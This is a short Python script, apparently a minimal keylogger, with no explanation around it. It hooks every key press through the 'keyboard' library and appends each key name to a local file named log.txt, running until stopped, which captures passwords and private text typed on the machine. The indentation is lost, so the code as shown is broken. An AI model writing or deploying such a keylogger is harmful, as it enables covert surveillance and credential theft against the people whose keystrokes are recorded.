import keyboard
def on_press_log(event):
string = event.name
fix_strng = string.replace("space",' ')
with open("log.txt",'a') as f:
f.write(fix_strng)
keyboard.on_press(on_press_log)
keyboard.wait()
